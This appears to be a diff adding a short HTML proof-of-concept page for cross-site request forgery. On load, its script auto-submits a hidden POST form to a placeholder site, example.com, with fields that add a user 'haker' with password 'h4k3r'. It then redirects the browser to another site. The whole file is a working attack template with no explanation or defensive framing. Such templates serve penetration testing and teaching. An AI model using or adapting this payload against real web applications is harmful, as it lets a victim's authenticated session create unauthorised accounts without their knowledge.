@@ -1,0 +1,16 @@
+<html>
+<head>
+<script language="javascript">
+function submitCSRF() {
+    document.csrf.submit()
+    setTimeout('location.replace("http://adamziaja.com")', 1000)
+}
+</script>
+</head>
+<body onload="submitCSRF()">
+<form action="http://example.com" method="POST" name="csrf">
+    <input type="hidden" name="useradd" value="haker">
+    <input type="hidden" name="password" value="h4k3r">
+</form>
+</body>
+</html>
